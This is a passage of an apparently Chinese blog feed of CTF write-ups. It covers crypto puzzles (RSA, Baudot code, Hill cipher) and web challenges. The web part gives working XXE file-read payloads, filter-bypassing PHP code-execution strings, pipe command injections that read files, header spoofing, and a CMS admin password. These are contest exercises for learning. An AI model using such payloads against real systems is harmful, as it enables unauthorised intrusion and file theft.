class="number">4568695582742345507136251229217400959960856046691733722988345503429689799935696593516299458516865110324638359470761456115925725067558499862591063153473862179550706262380644940013531317571260647226561004191266100720745936563550699000939117068559232225644277283541933064331891245169739139886735615435506152070330233107807124410892978280063993668726927377177983100529270996547002022341628251905780873531481682713820809147098305289391835297208890779643623465917824350382592808578978330348769060448006691307027594085634520759293965723855183484366752511654099121387261343686017189426761536281948007104498017003911</span></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8fb873baba0df4a6423be9f4bd525d93&#125;</span><br></pre></td></tr></table></figure><br><h3 id="no-blank-space"><a href="#no-blank-space" class="headerlink" title="no blank space"></a>no blank space</h3><p>é¢˜ç›®ï¼šå‡ºé¢˜äººçš„ç”µè„‘å¹´ä¹…å¤±ä¿®ï¼Œç©ºæ ¼é”®å¤±çµäº†ï¼Œä½ èƒ½æ‰¾åˆ°ç”µæŠ¥é‡Œçš„ç§˜å¯†å—(æ³¨:flagå†…å­—æ¯å…¨éƒ¨å¤§å†™ï¼‰   flagæ ¼å¼ï¼šHECTF{.+}</p><p>hintï¼šè¯•è¯•åˆ«çš„ç”µæŠ¥ç å­</p><p>hintï¼šå¤è€çš„5bitç¼–ç </p><ul><li>cipher.txt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.</span><br></pre></td></tr></table></figure><p><a href="https://blog.by24.cn/archives/character-encoding-baudot-code.html"><strong>åšå¤šç </strong></a></p><p>å°†<code>.</code>æ¢æˆ<code>1</code>ï¼Œ<code>-</code>æ¢æˆ<code>0</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.&#x27;</span>;</span><br><span class="line">$a = str_replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, $a);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10100000010111010000011011000010100110111011111111001011101110111111110010101100100001110011011101101111101010001011101100001</span><br></pre></td></tr></table></figure><p>ç”¨è¿™ä¸ªç½‘ç«™è§£ç ï¼š<a href="https://www.boxentriq.com/code-breaking/baudot-code">Baudot Code, Baudot-Murray Code (online tool) | Boxentriq</a></p><p><img src="https://s3.ax1x.com/2020/11/26/D0J7Sf.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTFTH1S1SNTM0RS3</span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸‹å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;TH1S1SNTM0RS3&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä¸€ä¸ªä¸€ä¸ªå¯¹ç…§è§£ç </p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/SywnzjKe8U58SVCRVHoDacZsHKyhtVKIcBasicyaIaYo0q5iafPeclgtZQeKAcHwaibLQHOwibWOiaT1J0saevG7acg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">10100H</span><br><span class="line">00001E</span><br><span class="line">01110C</span><br><span class="line">10000T</span><br><span class="line">01101F</span><br><span class="line">10000T</span><br><span class="line">10100H</span><br><span class="line">11011åˆ‡æ¢åˆ°æ•°å­—</span><br><span class="line">101111</span><br><span class="line">11111åˆ‡æ¢åˆ°å­—æ¯</span><br><span class="line">00101S</span><br><span class="line">11011åˆ‡æ¢åˆ°æ•°å­—</span><br><span class="line">101111</span><br><span class="line">11111åˆ‡æ¢åˆ°å­—æ¯</span><br><span class="line">00101S</span><br><span class="line">01100N</span><br><span class="line">10000T</span><br><span class="line">11100M</span><br><span class="line">11011åˆ‡æ¢åˆ°æ•°å­—</span><br><span class="line">101100</span><br><span class="line">11111åˆ‡æ¢åˆ°å­—æ¯</span><br><span class="line">01010R</span><br><span class="line">00101S</span><br><span class="line">11011åˆ‡æ¢åˆ°æ•°å­—</span><br><span class="line">000013</span><br></pre></td></tr></table></figure><br><h3 id="å¸Œå°”å¯†ç "><a href="#å¸Œå°”å¯†ç " class="headerlink" title="å¸Œå°”å¯†ç "></a>å¸Œå°”å¯†ç </h3><p>é¢˜ç›®ï¼šå‡ºé¢˜äººæƒ³æ‚„æ‚„é€ç»™å¤§å®¶flagï¼Œflagå°±æ˜¯HECTF{ezthâ€¦â€¦ï¼ˆç³Ÿç³•,å°å“²å“²å¸ˆå‚…çªç„¶å µä½äº†æˆ‘çš„å˜´</p><p>hintï¼šå·²çŸ¥éƒ¨åˆ†æ˜æ–‡ï¼Œä¸å¦‚è¯•è¯•è§£å‡ºkeyå­</p><p>hintï¼šhectf åŸæ¥è¿™æ˜¯äº”ä¸ªå­—</p><ul><li>cipher.txt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdqsrppwuzzyjhwrhyzripfpxol</span><br></pre></td></tr></table></figure><p><strong>è¿˜æ²¡æœ‰wp</strong></p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬ä¸‰å±Šæµ·å•¸æ¯ write up</title>
      <link href="2020/11/19/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF%20write%20up/"/>
      <url>2020/11/19/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF%20write%20up/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="G2mtuå­¦ç”Ÿ"><a href="#G2mtuå­¦ç”Ÿ" class="headerlink" title="G2mtuå­¦ç”Ÿ?"></a>G2mtuå­¦ç”Ÿ?</h3><p><strong>X-Forwarded-Forç»•è¿‡ã€Cookieä¼ªé€ </strong></p><p>ç”¨Burp SuiteæŠ“åŒ…ï¼Œå°†<code>user=0</code>æ”¹ä¸º<code>user=1</code>ï¼Œæ·»åŠ X-Forwarded-For:127.0.0.1</p><p><img src="https://s3.ax1x.com/2020/11/19/DunHr8.png" alt="DunHr8.png"></p><a id="more"></a><br><h3 id="Who-are-youï¼Ÿ"><a href="#Who-are-youï¼Ÿ" class="headerlink" title="Who are youï¼Ÿ"></a>Who are youï¼Ÿ</h3><p>ç”¨Burp suiteæŠ“åŒ…ï¼Œå‘ç°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;feedback&gt;&lt;author&gt;aaa&lt;/author&gt;&lt;/feedback&gt;</span><br></pre></td></tr></table></figure><p>å¥½åƒæ˜¯XXEæ¼æ´ï¼Œåœ¨ä¹¦ä¸ŠæŸ¥çœ‹æ”»å‡»æ–¹å¼</p><p><img src="https://s3.ax1x.com/2020/11/19/DuuoFJ.jpg" alt="DuuoFJ.jpg"></p><p>å°è¯•ç”¨phpä¼ªåè®®è¯»å–flag.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot; &gt;</span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">&lt;xml&gt;</span><br><span class="line">&lt;xxe&gt;&amp;b;&lt;/xxe&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°è¯»ä¸å‡ºæ¥ï¼Œè·³è½¬åˆ°æ ¹ç›®å½•ä¸‹è¯»å–ä¹Ÿä¸è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=../../../../../../flag.php</span><br></pre></td></tr></table></figure><p>å°è¯•è¯»å–index.phpï¼Œè¯»å–æˆåŠŸï¼Œå¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCmxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIoZmFsc2UpOw0KJGRhdGEgPSBAZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7DQokcmVzcCA9ICcnOw0KLy8kZmxhZz0nZmxhZ3s3OWQxMDYyNi1kMjdmLTQ1NjktYTYyOS1jOTYwNmQwMzc4ZjJ9JzsNCmlmKCRkYXRhICE9IGZhbHNlKXsNCiAgICAkZG9tID0gbmV3IERPTURvY3VtZW50KCk7DQogICAgJGRvbS0+bG9hZFhNTCgkZGF0YSwgTElCWE1MX05PRU5UKTsNCiAgICBvYl9zdGFydCgpOw0KICAgICRyZXMgID0gJGRvbS0+dGV4dENvbnRlbnQ7DQogICAgJHJlc3AgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICBpZiAoJHJlcyl7DQogICAgICAgIGRpZSgkcmVzKTsNCiAgICB9DQoNCn0NCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8dGl0bGU+d2VsY29tZTwvdGl0bGU+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iaWU9ZWRnZSI+DQoNCjwvaGVhZD4NCjxib2R5IGNsYXNzPSJjb250YWN0Qm9keSI+DQo8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4NCiAgICA8ZGl2IGNsYXNzPSJ0aXRsZSI+DQoNCg0KICAgIDwvZGl2Pg0KDQoNCiAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIGNsYXNzPSJmb3JtIj4NCiAgICAgICAgPGgxIGlkPSJ0aXRsZSI+6K+36L6T5YWl5aeT5ZCNPC9oMT4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJuYW1lIGVudHJ5ICIgaWQ9Im5hbWUiIG5hbWU9Im5hbWUiIHBsYWNlaG9sZGVyPSJZb3VyIE5hbWUiLz4NCiAgICA8L2Zvcm0+DQogICAgPGJ1dHRvbiBjbGFzcz0ic3VibWl0IGVudHJ5IiBvbmNsaWNrPSJmdW5jKCkiPlN1Ym1pdDwvYnV0dG9uPg0KDQogICAgPGRpdiBjbGFzcz0ic2hhZG93Ij48L2Rpdj4NCjwvZGl2Pg0KDQo8L2JvZHk+DQo8L2h0bWw+DQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQogICAgZnVuY3Rpb24gcGxheSgpIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBmdW5jdGlvbiBmdW5jKCkgew0KICAgICAgICAvLyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgpLnZhbHVlDQogICAgICAgIHZhciB4bWwgPSAnJyArDQogICAgICAgICAgICAnPFw&#x2F;eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ilw&#x2F;PicgKw0KICAgICAgICAgICAgJzxmZWVkYmFjaz4nICsNCiAgICAgICAgICAgICc8YXV0aG9yPicgKyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmFtZScpLnZhbHVlKyAnPC9hdXRob3I+JyArDQogICAgICAgICAgICAnPC9mZWVkYmFjaz4nOw0KICAgICAgICBjb25zb2xlLmxvZyh4bWwpOw0KICAgICAgICB2YXIgeG1saHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICB4bWxodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsNCiAgICAgICAgICAgIGlmICh4bWxodHRwLnJlYWR5U3RhdGUgPT0gNCkgew0KICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKHhtbGh0dHAucmVhZHlTdGF0ZSk7DQogICAgICAgICAgICAgICAgLy8gY29uc29sZS5sb2coeG1saHR0cC5yZXNwb25zZVRleHQpOw0KICAgICAgICAgICAgICAgIHZhciByZXMgPSB4bWxodHRwLnJlc3BvbnNlVGV4dDsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGl0bGUnKS50ZXh0Q29udGVudCA9IHJlcw0KICAgICAgICAgICAgfQ0KICAgICAgICB9Ow0KICAgICAgICB4bWxodHRwLm9wZW4oIlBPU1QiLCAiaW5kZXgucGhwIiwgdHJ1ZSk7DQogICAgICAgIHhtbGh0dHAuc2VuZCh4bWwpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfTsNCjwvc2NyaXB0Pg0KPC9ib2R5Pg0KPC9odG1sPg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>ç”¨base64è§£å¯†ï¼Œå¾—åˆ°æºç ï¼Œflagå°±åœ¨æºç é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$resp = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//$flag=&#x27;flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;&#x27;;</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="literal">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./style.css&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class=&quot;contactBody&quot;&gt;</span><br><span class="line">&lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;title&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method=&quot;post&quot; class=&quot;form&quot;&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">&quot;title&quot;</span>&gt;Ã¨Â¯Â·Ã¨Â¾Â“Ã¥Â…Â¥Ã¥Â§Â“Ã¥ÂÂ&lt;/h1&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; class=&quot;name entry &quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Your Name&quot;/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;button class=&quot;submit entry&quot; onclick=&quot;func()&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;shadow&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;\?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;\?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;feedback&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;author&gt;&#x27;</span> + document.getElementById(<span class="string">&#x27;name&#x27;</span>).value+ <span class="string">&#x27;&lt;/author&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;/feedback&gt;&#x27;</span>;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                document.getElementById(<span class="string">&#x27;title&#x27;</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;index.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><h3 id="æ— å‚æ•°RCE"><a href="#æ— å‚æ•°RCE" class="headerlink" title="æ— å‚æ•°RCE"></a>æ— å‚æ•°RCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">$a=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/&quot;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a=&quot;</span>.$_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>($a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>åˆ©ç”¨SESSIONIDæ¥ä¼ å‚ï¼Œè¯»å–flag</p><p><img src="https://s3.ax1x.com/2020/11/19/DuQkdS.png" alt="DuQkdS.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;Show_source(Session_id(Session_start()));</span><br><span class="line">PHPSESSID&#x3D;flag.php</span><br></pre></td></tr></table></figure><br><p>æˆ–è€…ï¼š</p><p>ç”¨scandir()è¯»å–ç›®å½•æºç ï¼Œä½†å¿…é¡»å¸¦æœ‰å‚æ•°ï¼ˆâ€™.â€™ï¼‰ï¼Œæ— æ³•é€šè¿‡æ­£åˆ™åŒ¹é…</p><p>ç”¨pos()å–localeconv()è¿”å›çš„æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯â€.â€</p><p>ä½†pos()è¢«è¿‡æ»¤äº†ï¼Œç”¨current()æ›¿æ¢ï¼Œprint_rä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå°è¯•ç”¨å¤§å†™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;Print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; admin.php [3] &#x3D;&gt; flag.php [4] &#x3D;&gt; hahaha.php [5] &#x3D;&gt; index.php ) 1 </span><br></pre></td></tr></table></figure><p>hintï¼šåè½¬ï¼Œéšæœºæ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;Var_dump(Readfile(array_rand(array_flip(scandir(Pos(localeconv()))))));</span><br></pre></td></tr></table></figure><p>ä¸€ç›´åˆ·æ–°ï¼Œç›´åˆ°çœ‹åˆ°<code>int(55)</code>ï¼ŒæŸ¥çœ‹æºç ä¹Ÿå¯ä»¥çœ‹åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readfile() Â  è¾“å‡ºä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">array_rand() Â  å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœè§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœº é”®åçš„æ•°ç»„ã€‚Â </span><br><span class="line">array_flip()   å‡½æ•°ç”¨äºåè½¬&#x2F;äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚</span><br></pre></td></tr></table></figure><br><h3 id="ç¥å¥‡çš„ç™»å½•æ¡†"><a href="#ç¥å¥‡çš„ç™»å½•æ¡†" class="headerlink" title="ç¥å¥‡çš„ç™»å½•æ¡†"></a>ç¥å¥‡çš„ç™»å½•æ¡†</h3><p>çœ‹äº†å®‡è±ªå¸ˆå…„çš„åšå®¢ï¼š<a href="https://www.getflag.cn/2020/11/10/%E6%B5%85%E8%B0%88ctf%E4%B8%AD%E6%97%A0%E5%9B%9E%E6%98%BE/">æµ…è°ˆctfä¸­æ— å›æ˜¾</a>ï¼Œæ‰çŸ¥é“æ€ä¹ˆåš</p><ul><li>|ls &gt; 1.txt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.txt</span><br><span class="line">flagggg.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure><ul><li>|cat flagggg.php &gt; 2.txt</li></ul><p><img src="https://s3.ax1x.com/2020/11/19/DuUbU1.png" alt="DuUbU1.png"></p><br><h3 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h3><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/r00tuser/p/8000508.html">[ä»£ç å®¡è®¡]XiaoCmsï¼ˆåå°ä»»æ„æ–‡ä»¶ä¸Šä¼ è‡³getshell,ä»»æ„ç›®å½•åˆ é™¤,ä¼šè¯å›ºå®šæ¼æ´</a></p><p>ç®¡ç†å‘˜è´¦å·ï¼šadmin</p><p>å¯†ç ï¼šadmin8888</p><br><p>åœ¨ç®¡ç†å‘˜åå°æ–°å»ºè¡¨å•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 